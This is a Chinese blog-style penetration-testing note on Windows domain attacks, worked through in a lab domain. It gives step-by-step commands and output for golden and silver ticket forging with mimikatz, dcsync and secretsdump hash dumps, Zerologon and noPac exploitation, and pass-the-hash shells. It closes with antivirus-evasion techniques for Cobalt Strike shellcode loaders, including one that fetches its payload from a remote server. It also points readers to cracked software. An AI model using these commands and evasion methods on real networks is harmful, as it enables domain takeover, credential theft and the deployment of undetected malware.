---
title: "域渗透思路与实践"
permalink: domain-penetration/
date: 2026-02-02 01:29:39
categories:
  - 网络安全
  - 内网渗透
tags:
  - 域渗透
  - Kerberoasting
  - PTH
img: /medias/featureimages/6.jpg
summary: "域内信息收集、Kerberoasting、PTH/PTT、委派攻击与域控提权的完整思路链。"
---

<!-- more -->

## PTT 攻击 （域内权限维持）
Pass  The   Ticket：票据传递攻击，传递TGT 票据或 ST 票据，实现黄金票据和白银票据的 权限维持

TGT 票据：在AS REP 出现。TGT 票据使用 Krbtgt 用户的NTLM hash 加密

ST 票据：在 TGS REP 出现，ST 票据使用的是 服务的 NTLM hash 加密

## 黄金票据
作用：**TGT 票据可以访问域环境中所有机器的所有服务**

选择一台成员主机，登录到 普通域用户 操作

`**baidu.com\han**`

前提：攻击者要通过信息泄露或攻击拿到： krbtgt 的 NTLM hash

 `krbtgt  b5f7658348e23f0715a4091ec03098d4`

### 清除票据
`klist purge`

```plain
[00000003] Primary
	 * Username : han
	 * Domain   : BAIDU
	 * LM       : f67ce55ac831223dc187b8085fe1d9df
	 * NTLM     : 161cff084477fe596a5db81874498a24
	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
```

```plain
mimikatz # lsadump::dcsync /all /csv
[DC] 'baidu.com' will be the domain
[DC] 'WIN-IG6QNBJMPCG.baidu.com' will be the DC server
[DC] Exporting domain 'baidu.com'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
1002    WIN-IG6QNBJMPCG$        76d165350c928d4692ad40b275fd7db1        532480
1001    32550   afffeba176210fad4628f0524bfe1942        512
500     Administrator   afffeba176210fad4628f0524bfe1942        512
502     krbtgt  b5f7658348e23f0715a4091ec03098d4        514
1105    PC1-WIN7$       7124211865f8f11565dcec9074b54ba8        4096
1106    PC2-WIN2008$    417c3756ac21ed8c75f8fbacb7ff43c5        4096
1108    user01  161cff084477fe596a5db81874498a24        66048
1109    admin01 7ecffff0c3548187607a14bad0f88bb1        66048
1110    han     161cff084477fe596a5db81874498a24        66048

mimikatz #
```

### 操作（mimikatz）
#### 1 定位域控主机名
`WIN-IG6QNBJMPCG`

#### 2 尝试读取域控的 c 盘共享 (要通过 netbios 读取，不能使⽤ ip 地址)
 NetBIOS 允许电脑通过**计算机名**来识别对方

 用于让同一局域网内的计算机能够相互发现并交流

`dir \\域控主机名\c$`

#### 3 使⽤mimikatz 进⾏⻩⾦票据 ptt 攻击
`kerberos::golden /user:administrator /domain:baidu.com /sid:S-1-5-21-3628107679-4118383267-2975722242 /krbtgt:b5f7658348e23f0715a4091ec03098d4 /ptt`

```plain
/user:administrator
/domain:域名
/sid 使用命令 whoami /all 可以看到，需要去除末尾的 uid
```

#### 4 查看结果
PTT 执行之前 dir  \\域控主机名\c$  显示拒绝访问

PTT 执行之后可以访问，说明黄金票据传递成功

清空票据后，执行 dir  \\域名主机名\c$ ,拒绝访问

### 操作（导出票据文件）
#### 1 使用mimikatz 导出黄金票据 文件ticker.kirbi
`ticker.kirbi 为 黄金票据`

`kerberos::golden /user:administrator /domain:baidu.com /sid:S-1-5-21-3628107679-4118383267-2975722242 /krbtgt:b5f7658348e23f0715a4091ec03098d4`

#### 2 如何使用 ticker.kribi 黄金票据文件
[https://github.com/fortra/impacket](https://github.com/fortra/impacket)

`pip install impacket`

#### 3 把 ticker.kirbi 文件 转为 python 可以识别的 ccache 文件
使用 脚本：ticketConverter.py

```plain
python ticketConverter.py 待转换的kirbi票据的路径 转换好的ccache票据的导出路径
```

`python ticketConverter.py /root/ticket.kirbi /root/ticket.ccache`

使用 psexec、wmiexec、atexec、dcomexec 加载票据文件

```bash
export KRB5CCNAME=上一步转换好的ccache文件绝对路径
```

`export KRB5CCNAME=/root/ticket.ccache`

#### 4 运行 （-code  gbk  避免乱码）
`python wmiexec.py baidu.com/administrator@WIN-IG6QNBJMPCG -dc-ip 192.168.79.85 -no-pass -k -codec gbk`

`python psexec.py\wmiexec.py 域名/administrator@目标主机名 -dc-ip 域控IP -target-ip 目标IP -no-pass -k -codec gbk`

⚠️-code  gbk 的作用 是避免拿到的 cmd 出现乱码

## 白银票据
作用：**ST 票据可以访问域环境中的指定机器的指定服务**，st 票据是 最终访问服务的票据，不会再经过 KDC 的验证，便于隐藏

什么是服务NTLM hash：
假设访问 WIN-IG6QNBJMPCG 主机的ldap 服务，那么白银票据中的服务 NTLM hash 是指 WIN-IG6QNBJMPCG 主机账户的 hash：

`**WIN-IG6QNBJMPCG$        76d165350c928d4692ad40b275fd7db1**`

```plain
mimikatz # lsadump::dcsync /all /csv
[DC] 'baidu.com' will be the domain
[DC] 'WIN-IG6QNBJMPCG.baidu.com' will be the DC server
[DC] Exporting domain 'baidu.com'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
1002    WIN-IG6QNBJMPCG$        76d165350c928d4692ad40b275fd7db1        532480
1001    32550   afffeba176210fad4628f0524bfe1942        512
500     Administrator   afffeba176210fad4628f0524bfe1942        512
502     krbtgt  b5f7658348e23f0715a4091ec03098d4        514
1105    PC1-WIN7$       7124211865f8f11565dcec9074b54ba8        4096
1106    PC2-WIN2008$    417c3756ac21ed8c75f8fbacb7ff43c5        4096
1108    user01  161cff084477fe596a5db81874498a24        66048
1109    admin01 7ecffff0c3548187607a14bad0f88bb1        66048
1110    han     161cff084477fe596a5db81874498a24        66048

mimikatz #
```

白银票据传递前:  无法访问域控的c$ 共享

### 操作：（mimikatz）
`kerberos::golden /user:administrator /domain:baidu.com /target:WIN-IG6QNBJMPCG.baidu.com /service:cifs /sid:S-1-5-21-3628107679-4118383267-2975722242 /rc4:76d165350c928d4692ad40b275fd7db1 /ptt`

```bash
kerberos::golden /user:administrator /domain:域名 /target:目标主机名.域名 /service:cifs
/sid:SID值 /rc4:服务的NTLMhash /ptt
```

```plain
targer:目标主机.域名
sid：当前用户的 sid
service：服务类型的对应功能/服务名称
rc4: WIN-IG6QNBJMPCG$ 的 NTLM hash
```

白银票据传递后：域控可以访问，其他主机，如：WIN2008 不可以访问

## 域常见漏洞
## CVE-2020-1472 （zerologon）
影响：

```plain
- Windows Server 2008 R2 Service Pack 1
- Windows Server 2012 / 2012 R2
- Windows Server 2016
- Windows Server 2019
- Windows Server version 1903 / 1909 / 2004 (Server Core installation)
```

### 危害：域控机器账户密码被置为空
### 操作步骤：
#### 1 检查漏洞是否存在
`**python   zerologon_tester.py   域控主机名  域控的ip地址 **`

`python zerologon_tester.py WIN-IG6QNBJMPCG 192.168.79.85`

#### 2 把域控主机账户的 NTLM hash 变为空
`**python CVE-2020-1472.py 域控主机名 域控主机账户名 域控ip**`

`python CVE-2020-1472.py WIN-IG6QNBJMPCG WIN-IG6QNBJMPCG$ 192.168.79.85`

`**31d6cfe0d16ae931b73c59d7e0c089c0**`

#### 3 使用空密码获取域中其他所有账户的 hash
`**secretsdump.exe 域名/域控主机账户名@域控ip地址 -no-pass**`

域控主机账户名 ：`**WIN-IG6QNBJMPCG$**`

`**secretsdump.exe baidu.com/WIN-IG6QNBJMPCG$@192.168.79.85 -no-pass**`

```properties
Administrator:500:aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b5f7658348e23f0715a4091ec03098d4:::
32550:1001:aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942:::
user01:1108:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
admin01:1109:aad3b435b51404eeaad3b435b51404ee:7ecffff0c3548187607a14bad0f88bb1:::
han:1110:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
WIN-IG6QNBJMPCG$:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
PC1-WIN7$:1105:aad3b435b51404eeaad3b435b51404ee:7124211865f8f11565dcec9074b54ba8:::
PC2-WIN2008$:1106:aad3b435b51404eeaad3b435b51404ee:417c3756ac21ed8c75f8fbacb7ff43c5:::
```

#### 4 使用域管理的hash 做 pth 攻击 或 krbtdt 的hash 做 ptt攻击
```agda
wmiexec.exe 域名/administrator@域控IP地址 -hashes 0:administrator域管的ntlmhash
```

`wmiexec.exe baidu.com/administrator@192.168.79.85 -hashes 0:afffeba176210fad4628f0524bfe1942`

#### 5 恢复 域控主机账户 原本的hash
在域控上保存SAM 数据库

```plain
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
下载域控 sam、system、security 文件（下载到了当前目录）

在攻击机上使用 secretsdump.exe 读取 sam、system、security
secretsdump.exe  -sam sam -system system -security security LOCAL

恢复hash
pythin reinstall_original_pw.py 域控主机名 域控ip 域控机器账户的hash
```

`secretsdump.exe -sam sam -system system -security security LOCA`

`python reinstall_original_pw.py WIN-IG6QNBJMPCG 192.168.79.85 76d165350c928d4692ad40b275fd7db1`

#### 6 虽然域控机器账户的hash恢复了，但是已经获取到的 域管理⽤户的 hash 和 krbtgt 的 hash 依然可⽤
`wmiexec.exe baidu.com/administrator@192.168.79.85 -hashes 0:afffeba176210fad4628f0524bfe1942`

## CVE-2021-42278（noPAC）
[https://github.com/Ridter/noPac](https://github.com/Ridter/noPac)

操作步骤：

### 前提：需要获取一个普通的域用户账户和密码
### PAC 是windows kerberos 认证中用户权限的标识
环境准备：新建一个新的python虚拟环境

`**pip install -r requirements.txt**`

`**pip install pycryptodome**`

`python noPac.py 域名/域普通用户名:'密码' -dc-ip 域控ip地址 -dc-host 域控主机名 -use-ldap -shell`

`python noPac.py baidu.com/han:'1qaz@WSX' -dc-ip 192.168.79.85 -dc-host WIN-IG6QNBJMPCG -use-ldap -shell`

## 免杀
## 杀毒软件如何查杀木马
+ **病毒库/启发式扫描：基于文件的特征，比如 mimikatz.exe 是已知的木马，就会根据 mimikatz.exe 的特征码精准查杀**
+ **沙箱：杀毒软件会把电脑上的文件上传到云沙箱中实际运行，查看是否是木马**
+ **内存检测、进程检测、网络检测**
+ **行为检测：比如新建用户、屏幕截图、更改注册表**
+ **威胁情报：共享已知黑客的ip地址和其他信息**

## shellcode 加载器
 shellcode ：漏洞攻击中实际起到作用的代码，shellcode 很小

 shellcode 大全  ：[https://shell-storm.org/shellcode/index.html](https://shell-storm.org/shellcode/index.html)

#### 原生的shellcode 加载器
 生成 cobaltstrike payload

 生成一个 bin 文件

 使用 010 editor 工具打开 bin 文件

⚠️ 010 editor 可以从官网下载试用 [https://www.sweetscape.com/010editor/](https://www.sweetscape.com/010editor/) 网上也能找到破解工具

 把copy as c code 的代码复制到 sc.c （记得修改变量名为 buf）

编译 c 为 exe 文件

⚠️ 想使用gcc 编译，需要下载windows gcc 环境，如 tdm gcc，下载链接
[https://jmeubank.github.io/tdm-gcc/articles/2021-05/10.3.0-release](https://jmeubank.github.io/tdm-gcc/articles/2021-05/10.3.0-release)

`**gcc sc.c -o 1.exe**`

 生成的1.exe是会被火绒杀掉的

### 分离免杀
#### 加密和密钥分离
 操作上一步生成的 bin 文件，使用 010 editor 进行 xor 计算

 输入一个感兴趣的 xor 操作数

 把xor 计算后的字节 copy as C code，并放到 sc+xor+arg.c 中

 编译 sc+xor+arg.c 为 exe 文件

`gcc "sc+xor+arg.c" -o 2.exe`

 2.exe 不会被火绒杀掉，运行 2.exe 的方式为

```cpp
2.exe xor操作数
```

#### 文件分离
 直接编译 sc+png.c 文件为 exe

```bash
gcc "sc+png.c" -o 3.exe
```

 3.exe 不会被火绒杀掉

 把bin文件改名为 1.png ，并和 3.exe 放在同一目录

 双击 3.exe 即可上线

#### 网络分离
把shellcode 文件（1.png）放在远程服务器，并开启 http 监听提供一个下载链接

 把下载链接替换到 sc+http.c 文件中

 编译 sc+http.c 为 exe 文件

```bash
gcc "sc+http.c" -o 4.exe -lwininet
```

 4.exe 不会被火绒杀掉

 双击运行 4.exe 即可上线
